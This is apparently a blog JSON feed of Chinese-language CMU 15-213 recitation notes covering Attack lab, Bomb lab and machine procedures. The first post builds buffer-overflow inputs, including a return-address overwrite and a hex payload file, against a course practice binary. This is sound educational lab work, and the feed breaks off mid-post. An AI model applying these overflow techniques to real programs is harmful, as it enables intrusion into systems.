{
    "version": "https://jsonfeed.org/version/1",
    "title": "望春风",
    "description": "计算机&数理&文学爱好者，喜欢健身、下厨、听音乐和看电影",
    "home_page_url": "https://salvely.github.io/blog",
    "items": [
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/",
            "title": "15-213 Attack lab recitation",
            "date_published": "2024-02-29T09:20:40.000Z",
            "content_html": "<p>输入<code>gdb activity</code>，开启 activity 之旅。</p>\n<blockquote>\n<p>Objective: The goal of this activity is to input a string that causes the program to call win(0x15213),<br>and thereby win a cookie.<br>在开启之前，先查看一下<code>solve</code>函数的内容：</p>\n</blockquote>\n<pre><code class=\"c\">void solve(void) &#123;\n    volatile long before = 0xb4;\n    char buf[16];\n    volatile long after = 0xaf;\n\n    Gets(buf);\n\n    if (before == 0x3331323531) &#123;\n        win(0x15213);\n    &#125;\n\n    if (after == 0x3331323831) &#123;\n        win(0x18213);\n    &#125;\n&#125;\n</code></pre>\n<p>看一下<code>solve</code>的汇编代码：</p>\n<pre><code>(gdb) disas solve\nDump of assembler code for function solve:\n   0x00000000000011df &lt;+0&gt;:     endbr64\n   0x00000000000011e3 &lt;+4&gt;:     sub    $0x38,%rsp\n   0x00000000000011e7 &lt;+8&gt;:     movq   $0xb4,0x28(%rsp)\n   0x00000000000011f0 &lt;+17&gt;:    movq   $0xaf,0x8(%rsp)\n   0x00000000000011f9 &lt;+26&gt;:    lea    0x10(%rsp),%rdi\n   0x00000000000011fe &lt;+31&gt;:    callq  0x1279 &lt;Gets&gt;\n   0x0000000000001203 &lt;+36&gt;:    mov    0x28(%rsp),%rdx\n   0x0000000000001208 &lt;+41&gt;:    movabs $0x3331323531,%rax\n   0x0000000000001212 &lt;+51&gt;:    cmp    %rax,%rdx\n   0x0000000000001215 &lt;+54&gt;:    je     0x1230 &lt;solve+81&gt;\n   0x0000000000001217 &lt;+56&gt;:    mov    0x8(%rsp),%rdx\n   0x000000000000121c &lt;+61&gt;:    movabs $0x3331323831,%rax\n   0x0000000000001226 &lt;+71&gt;:    cmp    %rax,%rdx\n   0x0000000000001229 &lt;+74&gt;:    je     0x123c &lt;solve+93&gt;\n   0x000000000000122b &lt;+76&gt;:    add    $0x38,%rsp\n   0x000000000000122f &lt;+80&gt;:    retq\n   0x0000000000001230 &lt;+81&gt;:    mov    $0x15213,%edi\n   0x0000000000001235 &lt;+86&gt;:    callq  0x1169 &lt;win&gt;\n   0x000000000000123a &lt;+91&gt;:    jmp    0x1217 &lt;solve+56&gt;\n   0x000000000000123c &lt;+93&gt;:    mov    $0x18213,%edi\n   0x0000000000001241 &lt;+98&gt;:    callq  0x1169 &lt;win&gt;\n   0x0000000000001246 &lt;+103&gt;:   jmp    0x122b &lt;solve+76&gt;\nEnd of assembler dump.\n</code></pre>\n<p>函数给<code>solve</code>预留了 56 个字节的空间：</p>\n<ol>\n<li><code>before = 0xb4</code>移动到<code>%rsp + 40</code>处</li>\n<li><code>after = 0xaf</code>移动到<code>%rsp + 8</code>处</li>\n<li><code>%rdi = %rsp + 16</code></li>\n<li>调用<code>gets</code></li>\n<li><code>%rdx = *(%rsp + 40)</code>，把<code>before</code>赋给<code>%rdx</code></li>\n<li><code>%rax = $0x3331323531</code></li>\n<li>接下来是个判断：</li>\n</ol>\n<pre><code class=\"c\">if(rdx == rax) &#123;\n    edi = 0x15213;\n    callq win\n&#125;\nrdx = *(rsp + 8);\nrax = 0x3331323831;\nif(rdx == rax) &#123;\n  edi = 0x18213;\n  callq win;\n&#125;\nrsp += 40;\nreturn;\n</code></pre>\n<p>完成<code>gets</code>之前的调用后，栈分布大致如下（一共 56 个字节的分配）：</p>\n<ol>\n<li><code>rsp</code>处没有值</li>\n<li><code>rsp + 8</code>处存储<code>after = 0xaf</code></li>\n<li><code>rsp + 16 ~ rsp + 24</code>处存储 16 字节的<code>buf</code></li>\n<li><code>rsp + 32</code>处 8 个字节空闲</li>\n<li><code>rsp + 40</code>处存储<code>before = 0xb4</code></li>\n<li><code>rsp + 56</code>处存储的是调用<code>solve</code>的<code>return address</code></li>\n</ol>\n<h3 id=\"普通缓冲区溢出\"><a href=\"#普通缓冲区溢出\" class=\"headerlink\" title=\"普通缓冲区溢出\"></a>普通缓冲区溢出</h3><p>查看代码可以理解，要让程序调用<code>win(0x15213)</code>，需要让<code>rdx == 0x3331323531</code>，而在这之前<code>rdx = before</code>，所以我们的根本目的是让<code>before = 0x3331323531</code>。就得让<code>buf</code>前 24 个字节为 0，后八个字节等于<code>0x3331323531</code>。该机器为小端法机器，那么这 8 个字节从低地址到高地址的顺序应该是：<code>0x31 0x35 0x32 0x31 0x33 0x00 0x00 0x00</code>，这 8 个个字节翻译成<code>ASCII码</code>就是<code>15213</code>。此外<code>gets</code>一定要读到<code>\\n</code>字符，它会把<code>\\n</code>替换为<code>\\0</code>字符。它不是读到<code>\\0</code>字符就终止。后面不需要加<code>0</code>，因为<code>0</code>的<code>ASCII</code>编码是<code>0x30</code>。如果最后加了 3 个<code>0</code>的话，最后 8 个字节的地址就会变成<code>0x31 0x35 0x32 0x31 0x33 0x30 0x30 0x30</code>。</p>\n<blockquote>\n<p>有几条要注意的点：</p>\n<ol>\n<li>机器为小端法机器，写内存的时候要把数字倒过来</li>\n<li><code>0x00</code>是在 ASCII 码里面是空字符，<code>0x30</code>在 ASCII 码里面是<code>0</code></li>\n<li><code>gets</code>要读到<code>\\n</code>，他会把<code>\\n</code>替换成<code>\\0</code>存储在<code>buf</code>中，无需手动<code>\\0</code></li>\n<li>输入的时候只能输入字符串，而不能输入 10 进制或者 16 进制的值，如果函数没有调用<code>atoi</code>，输入一律被当作字符串处理。因此我们需要输入<code>0x3331323531</code>对应的<code>ASCII</code>编码，而不是这个值本身。</li>\n</ol>\n</blockquote>\n<p>输入<code>01234567890123456789012315213</code>，成功调用<code>win(0x15213)</code>。如下：</p>\n<pre><code>gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src$ ./activity\n01234567890123456789012315213\nYou win 1 cookie! Great start!\nReturning normally from main\n</code></pre>\n<h3 id=\"包含返回地址攻击的缓冲区溢出\"><a href=\"#包含返回地址攻击的缓冲区溢出\" class=\"headerlink\" title=\"包含返回地址攻击的缓冲区溢出\"></a>包含返回地址攻击的缓冲区溢出</h3><p>要让这个<code>solve</code>函数跳转到我们插入的代码段（未开启栈随机化&#x2F;<code>canary</code>&#x2F;<code>NX bit</code>及其他防护机制，不考虑<code>nop sled</code>），我们需要利用缓冲区溢出，让<code>return address</code>修改为我们所插入的代码段的地址。我们需要让<code>buf</code>的前 40 个字节为任意内容，最后 8 个字节为我们插入的攻击代码的地址。</p>\n<p>我们这次的目的是想调到<code>&lt;solve +93&gt;</code>位置处，本次运行过程中该位置的地址是<code>0x000055555555523c</code>，过会儿我们要将其插入<code>buf</code>的第 48-48 字节处。该地址的值换算成小端法是<code>0x3c 0x52 0x55 0x55 0x55 0x55 0x00 0x00</code>。其对应的<code>ASCII码</code>是<code>&lt;RUUUU</code>，后面的<code>null</code>为<code>0x00</code>。我们要让程序返回的时候跳转到<code>mov $0x18213,%edi</code>。那么构造的字符串应该是<code>0123456789012345678901234567890123456789&lt;RUUUU</code>。结果如下：</p>\n<pre><code>43          if (after == 0x3331323831) &#123;\n(gdb) n\nsolve () at activity.c:44\n44              win(0x18213);\n(gdb)\nYou win 2 cookies! Woohoo!\n0x0000000000000000 in ?? ()\n</code></pre>\n<p>成功！</p>\n<h3 id=\"引导程序到攻击代码\"><a href=\"#引导程序到攻击代码\" class=\"headerlink\" title=\"引导程序到攻击代码\"></a>引导程序到攻击代码</h3><p>此处我们进行更进阶的攻击，程序中函数<code>solve()</code>并未调用过<code>win(0x18613)</code>，让我们尝试返回到<code>win(0x18613)</code>中。此时我们不光只破解<code>solve()</code>，还需要对<code>win</code>函数的代码进行分析。结果如下：</p>\n<pre><code>(gdb) disas win\nDump of assembler code for function win:\n   0x0000555555555169 &lt;+0&gt;:     endbr64\n   0x000055555555516d &lt;+4&gt;:     sub    $0x8,%rsp\n   0x0000555555555171 &lt;+8&gt;:     cmp    $0x15213,%edi\n   0x0000555555555177 &lt;+14&gt;:    je     0x5555555551a7 &lt;win+62&gt;\n   0x0000555555555179 &lt;+16&gt;:    cmp    $0x18213,%edi\n   0x000055555555517f &lt;+22&gt;:    je     0x5555555551b5 &lt;win+76&gt;\n   0x0000555555555181 &lt;+24&gt;:    cmp    $0x18613,%edi\n   0x0000555555555187 &lt;+30&gt;:    je     0x5555555551c3 &lt;win+90&gt;\n   0x0000555555555189 &lt;+32&gt;:    mov    0x2ea1(%rip),%eax        # 0x555555558030 &lt;mystery&gt;\n   0x000055555555518f &lt;+38&gt;:    cmp    $0x15513,%eax\n   0x0000555555555194 &lt;+43&gt;:    je     0x5555555551d1 &lt;win+104&gt;\n   0x0000555555555196 &lt;+45&gt;:    lea    0xed3(%rip),%rdi        # 0x555555556070\n   0x000055555555519d &lt;+52&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551a2 &lt;+57&gt;:    add    $0x8,%rsp\n   0x00005555555551a6 &lt;+61&gt;:    retq\n   0x00005555555551a7 &lt;+62&gt;:    lea    0xe5a(%rip),%rdi        # 0x555555556008\n   0x00005555555551ae &lt;+69&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551b3 &lt;+74&gt;:    jmp    0x5555555551a2 &lt;win+57&gt;\n   0x00005555555551b5 &lt;+76&gt;:    lea    0xedc(%rip),%rdi        # 0x555555556098\n   0x00005555555551bc &lt;+83&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551c1 &lt;+88&gt;:    jmp    0x5555555551a2 &lt;win+57&gt;\n   0x00005555555551c3 &lt;+90&gt;:    lea    0xe5e(%rip),%rdi        # 0x555555556028\n   0x00005555555551ca &lt;+97&gt;:    callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551cf &lt;+102&gt;:   jmp    0x5555555551a2 &lt;win+57&gt;\n   0x00005555555551d1 &lt;+104&gt;:   lea    0xe78(%rip),%rdi        # 0x555555556050\n   0x00005555555551d8 &lt;+111&gt;:   callq  0x555555555030 &lt;puts@plt&gt;\n   0x00005555555551dd &lt;+116&gt;:   jmp    0x5555555551a2 &lt;win+57&gt;\nEnd of assembler dump.\n</code></pre>\n<p>我们需要跳转到<code>if(arg == 0x18613)</code>后面那句，也就是<code>&lt;win+90&gt;</code>处，该条指令的地址是<code>0x00005555555551c3</code>，转化成小端法是<code>0xc3 0x51 0x55 0x55 0x55 0x55 0x00 0x00</code>，转化成<code>ASCII码</code>也就是<code>ÃQUUUU</code>。因此，我们构造的字符串应该是<code>0123456789012345678901234567890123456789ÃQUUUU</code>。结果如下：</p>\n<pre><code>(gdb) p $rsp\n$2 = (void *) 0x555555559018 &lt;my_stack+4056&gt;\n(gdb) x/s 0x555555559018\n0x555555559018 &lt;my_stack+4056&gt;: &quot;ÃQUUUU&quot;\n(gdb) x/6bx 0x555555559018\n0x555555559018 &lt;my_stack+4056&gt;: 0xc3    0x83    0x51    0x55    0x55    0x55\n</code></pre>\n<p>这里出现了一点问题，就是<code>Ã</code>采用<code>Unicode</code>扩展编码，其编码为<code>0xc3 0x83</code>，而我们仅仅需要<code>0xc3</code>，因此我们需要将 16 进制的地址写在文件里，然后用文件作为<code>activity</code>的输入。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwNF9zbGlkZXMucGRm\">Slides 中最后一页</span>告诉我们，提供了<code>hex2raw</code>脚本，可以把 16 进制值写到<code>input2.txt</code>中，然后通过<code>hex2raw</code>转化为<code>input2.bin</code>。我们在<code>input2.txt</code>中写入值<code>30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 31 35 32 31 33 00 30 31 32 33 34 35 36 37 38 39 c3 51 55 55 55 55</code>，将其转化，然后输入<code>./activity &lt; ../inputs/input2.bin</code>。<br>结果如下：</p>\n<pre><code>(gdb) r &lt; ../inputs/input2.bin\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src/activity &lt; ../inputs/input2.bin\nYou win 3 cookies! That&#39;s right!\n\nProgram received signal SIGSEGV, Segmentation fault.\n</code></pre>\n<p>成功！</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/",
            "title": "15-213 Bomb lab recitation 记录",
            "date_published": "2024-02-29T09:19:39.000Z",
            "content_html": "<h2 id=\"act1\"><a href=\"#act1\" class=\"headerlink\" title=\"act1\"></a>act1</h2><p>依次输入如下指令：</p>\n<pre><code>(gdb) disassemble main // show the assembly instructions in main\n</code></pre>\n<p>其<code>main</code>函数反汇编结果如下：</p>\n<pre><code>(gdb) disassemble main\nDump of assembler code for function main:\n   0x0000000000401730 &lt;+0&gt;:     endbr64\n   0x0000000000401734 &lt;+4&gt;:     push   %rbx\n   0x0000000000401735 &lt;+5&gt;:     movslq %edi,%rdi\n   0x0000000000401738 &lt;+8&gt;:     mov    %rsi,%rbx\n   0x000000000040173b &lt;+11&gt;:    xor    %eax,%eax\n   0x000000000040173d &lt;+13&gt;:    mov    -0x8(%rsi,%rdi,8),%rdx\n   0x0000000000401742 &lt;+18&gt;:    lea    0xa8eb6(%rip),%rsi        # 0x4aa5ff\n   0x0000000000401749 &lt;+25&gt;:    mov    $0x1,%edi\n   0x000000000040174e &lt;+30&gt;:    callq  0x44b9a0 &lt;__printf_chk&gt;\n   0x0000000000401753 &lt;+35&gt;:    movq   $0x0,(%rbx)\n   0x000000000040175a &lt;+42&gt;:    pop    %rbx\n   0x000000000040175b &lt;+43&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>该汇编代码的过程如下：</p>\n<pre><code class=\"c\">int main(int argc, char*argv[])\n&#123;\n    int ret = printf(&quot;%s\\n&quot;,argv[argc-1]);\n    return ret;\n&#125;\n</code></pre>\n<h2 id=\"act2\"><a href=\"#act2\" class=\"headerlink\" title=\"act2\"></a>act2</h2><p>反汇编<code>main</code>函数：</p>\n<pre><code>(gdb) disas main\nDump of assembler code for function main:\n   0x00000000004016c0 &lt;+0&gt;:     endbr64\n   0x00000000004016c4 &lt;+4&gt;:     push   %rbx\n   0x00000000004016c5 &lt;+5&gt;:     movslq %edi,%rdi\n   0x00000000004016c8 &lt;+8&gt;:     mov    %rsi,%rbx\n   0x00000000004016cb &lt;+11&gt;:    mov    -0x8(%rsi,%rdi,8),%rsi\n   0x00000000004016d0 &lt;+16&gt;:    lea    0x9392d(%rip),%rdi        # 0x495004\n   0x00000000004016d7 &lt;+23&gt;:    callq  0x401c75 &lt;stc&gt;\n   0x00000000004016dc &lt;+28&gt;:    movq   $0x0,(%rbx)\n   0x00000000004016e3 &lt;+35&gt;:    pop    %rbx\n   0x00000000004016e4 &lt;+36&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>输入下列指令用 16 进制打印<code>%rsi</code>和<code>%rdi</code>的值：</p>\n<pre><code>(gdb) print /x $rsi\n$1 = 0x7fffffffdf18\n(gdb) print /x $rdi\n$2 = 0x1\n</code></pre>\n<p>由此看<code>$rdi</code>应该是<code>argc</code>,而<code>$rsi</code>应该是<code>argv</code>。</p>\n<p>再输入<code>disas stc</code>，获得如下结果：</p>\n<pre><code>(gdb) disas stc\nDump of assembler code for function stc:\n   0x0000000000401c75 &lt;+0&gt;:     push   %rbx\n   0x0000000000401c76 &lt;+1&gt;:     mov    %rsi,%rbx\n   0x0000000000401c79 &lt;+4&gt;:     callq  0x4115d0 &lt;puts&gt;\n   0x0000000000401c7e &lt;+9&gt;:     mov    %rbx,%rdi\n   0x0000000000401c81 &lt;+12&gt;:    callq  0x4115d0 &lt;puts&gt;\n   0x0000000000401c86 &lt;+17&gt;:    pop    %rbx\n   0x0000000000401c87 &lt;+18&gt;:    retq\n   0x0000000000401c88 &lt;+19&gt;:    nopl   0x0(%rax,%rax,1)\nEnd of assembler dump.\n</code></pre>\n<p>将其转化为 C 语言函数应该是：</p>\n<pre><code class=\"c\">// a:rsi b:rdi\nint stc(char* a, char* b)\n&#123;\n   // 压入原rbx\n   rbx = rsi;\n   puts(rbx);\n   rdi = rbx;\n   puts(rbx);\n   // 恢复rbx\n   // nopl是干嘛用的？\n   return rax;\n&#125;\n</code></pre>\n<h2 id=\"act3\"><a href=\"#act3\" class=\"headerlink\" title=\"act3\"></a>act3</h2><p>观察<code>main</code>函数的 C 代码，发现只要<code>compare</code>函数返回 1 即可通关。对<code>compare</code>函数进行反汇编可得：</p>\n<pre><code>(gdb) disas compare\nDump of assembler code for function compare:\n   0x0000000000401c95 &lt;+0&gt;:     push   %rbx\n   0x0000000000401c96 &lt;+1&gt;:     mov    %rdi,%rbx\n   0x0000000000401c99 &lt;+4&gt;:     add    $0x5,%rbx\n   0x0000000000401c9d &lt;+8&gt;:     add    %rsi,%rbx\n   0x0000000000401ca0 &lt;+11&gt;:    cmp    $0x3b6d,%rbx\n   0x0000000000401ca7 &lt;+18&gt;:    sete   %al\n   0x0000000000401caa &lt;+21&gt;:    movzbq %al,%rax\n   0x0000000000401cae &lt;+25&gt;:    pop    %rbx\n   0x0000000000401caf &lt;+26&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>还原其 C 代码如下：</p>\n<pre><code class=\"c\">// rdi:a rsi:b\nint compare(int a,int b)\n&#123;\n   int ret;\n   //压入原rbx\n   rbx = a;\n   rbx += 0x5;\n   rbx += b;\n   rbx = a + b + 0x5;\n   if(rbx == 0x3b6d) &#123;\n      ret = 1;\n   &#125;\n   else &#123;\n      ret = 0;\n   &#125;\n   // 恢复原Rbx\n   return ret;\n&#125;\n</code></pre>\n<p>发现<code>compare</code>就要求<code>a + b = 0x3b68(10进制15208)</code>。在<code>gdb</code>中只能输入 10 进制数字，如果输入 16 进制数字的话会被当成字符串。运行<code>./act3 15208 0</code>，成功！</p>\n<pre><code>gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act3 15208 0\ngood args!\n</code></pre>\n<h2 id=\"act4\"><a href=\"#act4\" class=\"headerlink\" title=\"act4\"></a>act4</h2><p>先查看<code>act4.c</code>的代码，看看是干嘛的：</p>\n<pre><code class=\"c\">void compute(int inArg)\n&#123;\n    int st;\n    inArg *= 3;\n    st = inArg &amp; 0xf;\n    do &#123;\n        switch(st)\n        &#123;\n            case 0: printf(&quot;Finish\\n&quot;); inArg = -1; break;\n            case 1: inArg *= 2; break;\n            case 2: inArg &gt;&gt;= 2; break;\n            case 3: inArg &amp;= 1; break;\n            case 4: inArg--; break;\n            default:  break;\n        &#125;\n        st = inArg &amp; 0xf;\n    &#125; while (inArg &gt;= 0);\n&#125;\n\nint main(int argc, char** argv)\n&#123;\n    int inArg;\n    if (argc == 1) &#123;fprintf(stderr, &quot;Please rerun with a positive number argument\\n&quot;); return 1;&#125;\n\n    inArg = atoi(argv[1]);\n    if (inArg &lt; 0) &#123;fprintf(stderr, &quot;Argument was not a positive integer\\n&quot;); return 1;&#125;\n    compute(inArg);\n\n    return 0;\n&#125;\n</code></pre>\n<p>所以我们要让 gdb 打印<code>Finish</code>，st 就得为 0，<code>inArg</code>就得为 0，那么就输入 1 个参数<code>0</code>即可。</p>\n<pre><code>gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act4 0\nFinish\n</code></pre>\n<p>我们要对汇编代码进行分析，就要使用<code>gdb</code>。输入<code>gdb act4</code>，输入<code>disas main</code>，得到如下结果：</p>\n<pre><code>(gdb) disas main\nDump of assembler code for function main:\n   0x0000000000401730 &lt;+0&gt;:     endbr64\n   0x0000000000401734 &lt;+4&gt;:     sub    $0x8,%rsp\n   0x0000000000401738 &lt;+8&gt;:     lea    0x938e1(%rip),%rdx        # 0x495020\n   0x000000000040173f &lt;+15&gt;:    cmp    $0x1,%edi\n   0x0000000000401742 &lt;+18&gt;:    je     0x40176d &lt;main+61&gt;\n   0x0000000000401744 &lt;+20&gt;:    mov    0x8(%rsi),%rdi\n   0x0000000000401748 &lt;+24&gt;:    mov    $0xa,%edx\n   0x000000000040174d &lt;+29&gt;:    xor    %esi,%esi\n   0x000000000040174f &lt;+31&gt;:    callq  0x410310 &lt;strtoq&gt;\n   0x0000000000401754 &lt;+36&gt;:    test   %eax,%eax\n   0x0000000000401756 &lt;+38&gt;:    js     0x401766 &lt;main+54&gt;\n   0x0000000000401758 &lt;+40&gt;:    mov    %eax,%edi\n   0x000000000040175a &lt;+42&gt;:    callq  0x401d20 &lt;compute&gt;\n   0x000000000040175f &lt;+47&gt;:    xor    %eax,%eax\n   0x0000000000401761 &lt;+49&gt;:    add    $0x8,%rsp\n   0x0000000000401765 &lt;+53&gt;:    retq\n   0x0000000000401766 &lt;+54&gt;:    lea    0x938e3(%rip),%rdx        # 0x495050\n   0x000000000040176d &lt;+61&gt;:    mov    0xbef54(%rip),%rdi        # 0x4c06c8 &lt;stderr&gt;\n   0x0000000000401774 &lt;+68&gt;:    mov    $0x1,%esi\n   0x0000000000401779 &lt;+73&gt;:    xor    %eax,%eax\n   0x000000000040177b &lt;+75&gt;:    callq  0x44c080 &lt;__fprintf_chk&gt;\n   0x0000000000401780 &lt;+80&gt;:    mov    $0x1,%eax\n   0x0000000000401785 &lt;+85&gt;:    jmp    0x401761 &lt;main+49&gt;\nEnd of assembler dump.\n</code></pre>\n<p>这里代码分析如下：</p>\n<pre><code class=\"c\">// 初始化 $rdi = 0x1, $rsi = 0x7fffffffdf18。因此 rdi = argc, rsi = argv\nint main(int argc, char* argv[])\n&#123;\n   // 预留8个字节的栈空间\n   rdx = rip + 0x938e1 -&gt; 这句是干嘛的？\n   if(edi == 1) &#123;\n      rdi = rip + 0xbef54; -&gt; stderr\n      esi = 0x1;\n      eax = 0;\n      call fprintf\n      eax = 1;\n      // rsp 恢复\n      return eax;\n   &#125;\n   else &#123;\n      rdi = *(rsi + 0x8);\n      ecx = 0xa;\n      esi = 0;\n      call strtoq;\n      if(eax &lt; 0) &#123;\n         rdx = 0x938e3 + rip;\n         rdi = *(rip + 0xbef54); -&gt; stderr\n         esi = 0x1;\n         eax = 0;\n         call fprintf\n         eax = 1;\n         // rsp 恢复\n         return eax;\n      &#125;\n      else &#123;\n         edi = eax;\n         call compute\n         eax = 0;\n         // rsp 恢复\n         return eax;\n      &#125;\n   &#125;\n&#125;\n</code></pre>\n<p>这里涉及到三个函数：<code>fprintf</code>，<code>strtoq</code>,<code>compute</code>。<code>fprintf</code>通常和<code>stderr</code>结合在一起。</p>\n<p>对<code>strtoq</code>进行反汇编得到如下结果：</p>\n<pre><code>(gdb) disas strtoq\nDump of assembler code for function strtoq:\n   0x0000000000410310 &lt;+0&gt;:     endbr64\n   0x0000000000410314 &lt;+4&gt;:     mov    $0xffffffffffffffa8,%rax\n   0x000000000041031b &lt;+11&gt;:    xor    %ecx,%ecx\n   0x000000000041031d &lt;+13&gt;:    mov    %fs:(%rax),%r8\n   0x0000000000410321 &lt;+17&gt;:    jmpq   0x410370 &lt;____strtoll_l_internal&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对<code>compute</code>进行反汇编得到如下结果：</p>\n<pre><code>(gdb) disas compute\nDump of assembler code for function compute:\n   0x0000000000401d20 &lt;+0&gt;:     endbr64\n   0x0000000000401d24 &lt;+4&gt;:     lea    (%rdi,%rdi,2),%edx\n   0x0000000000401d27 &lt;+7&gt;:     lea    0x932de(%rip),%rcx        # 0x49500c\n   0x0000000000401d2e &lt;+14&gt;:    mov    %edx,%eax\n   0x0000000000401d30 &lt;+16&gt;:    and    $0xf,%eax\n   0x0000000000401d33 &lt;+19&gt;:    cmp    $0x4,%eax\n   0x0000000000401d36 &lt;+22&gt;:    ja     0x401d53 &lt;compute+51&gt;\n   0x0000000000401d38 &lt;+24&gt;:    movslq (%rcx,%rax,4),%rax\n   0x0000000000401d3c &lt;+28&gt;:    add    %rcx,%rax\n   0x0000000000401d3f &lt;+31&gt;:    notrack jmpq *%rax\n   0x0000000000401d42 &lt;+34&gt;:    nopw   0x0(%rax,%rax,1)\n   0x0000000000401d48 &lt;+40&gt;:    and    $0x1,%edx\n   0x0000000000401d4b &lt;+43&gt;:    mov    %edx,%eax\n   0x0000000000401d4d &lt;+45&gt;:    jmp    0x401d33 &lt;compute+19&gt;\n   0x0000000000401d4f &lt;+47&gt;:    nop\n   0x0000000000401d50 &lt;+48&gt;:    sar    $0x2,%edx\n   0x0000000000401d53 &lt;+51&gt;:    mov    %edx,%eax\n   0x0000000000401d55 &lt;+53&gt;:    and    $0xf,%eax\n   0x0000000000401d58 &lt;+56&gt;:    test   %edx,%edx\n   0x0000000000401d5a &lt;+58&gt;:    jns    0x401d33 &lt;compute+19&gt;\n   0x0000000000401d5c &lt;+60&gt;:    retq\n   0x0000000000401d5d &lt;+61&gt;:    nopl   (%rax)\n   0x0000000000401d60 &lt;+64&gt;:    add    %edx,%edx\n   0x0000000000401d62 &lt;+66&gt;:    jmp    0x401d53 &lt;compute+51&gt;\n   0x0000000000401d64 &lt;+68&gt;:    nopl   0x0(%rax)\n   0x0000000000401d68 &lt;+72&gt;:    sub    $0x1,%edx\n   0x0000000000401d6b &lt;+75&gt;:    jmp    0x401d53 &lt;compute+51&gt;\n   0x0000000000401d6d &lt;+77&gt;:    nopl   (%rax)\n   0x0000000000401d70 &lt;+80&gt;:    lea    0x9328d(%rip),%rsi        # 0x495004\n   0x0000000000401d77 &lt;+87&gt;:    mov    $0x1,%edi\n   0x0000000000401d7c &lt;+92&gt;:    xor    %eax,%eax\n   0x0000000000401d7e &lt;+94&gt;:    jmpq   0x44bfb0 &lt;__printf_chk&gt;\nEnd of assembler dump.\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/",
            "title": "15-213 Machine Procedures Activity 记录",
            "date_published": "2024-02-29T09:18:15.000Z",
            "content_html": "<h2 id=\"Activity-1\"><a href=\"#Activity-1\" class=\"headerlink\" title=\"Activity 1\"></a>Activity 1</h2><p>输入<code>gdb --args ./calls</code>，输入<code>r</code>，提示如下：</p>\n<pre><code>  (gdb) r\nIf you didn&#39;t run it that way, it will now crash.\nOtherwise, you will get the (gdb) prompt back.\n\nType &#39;c&#39; (short for &#39;continue&#39;) at the (gdb) prompt.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/calls.c:148\n148     machine-procedures/calls.c: No such file or directory.\n</code></pre>\n<p>输入两次<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nshowStack has been called again. Let&#39;s look at the contents\nof the stack right now (just before the pop is executed):\n(gdb) x/2gx $rsp\n\n(Recall that the &#39;x&#39; command prints memory. The &#39;/2gx&#39; modifier\ntells it to print two &#39;g&#39;iant (64-bit) values in he&#39;x&#39;adecimal,\nand &#39;$rsp&#39; means to start at the current value of the %rsp\nregister, i.e. the stack pointer.)\n\nAnswer Problem 1 now: fill in the blanks with the value of the stack pointer\nand the contents of the stack. When you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x00000000004011e1 in showStack ()\n</code></pre>\n<p>输入<code>x/2gx $rsp</code>，得到如下信息：</p>\n<pre><code>(gdb) x/2gx $rsp\n0x7fffffffdde0: 0x0000000000015213      0x000000000040117a\n</code></pre>\n<p>此时<code>$rsp = (void *) 0x7fffffffdde0</code>，其指向的地址的值如上图所示。打印<code>0x000000000040117a</code>处的值，可以看到如下结果：</p>\n<pre><code>(gdb) x/2gx 0x000000000040117a\n0x40117a &lt;main+48&gt;:     0xe37e02fb8301c383      0xfea4e800402108bf\n</code></pre>\n<p><code>gdb</code>显示这里是<code>&lt;main + 48&gt;</code>，那么我们对<code>main</code>函数进行反汇编：</p>\n<pre><code>(gdb) disassemble main\nDump of assembler code for function 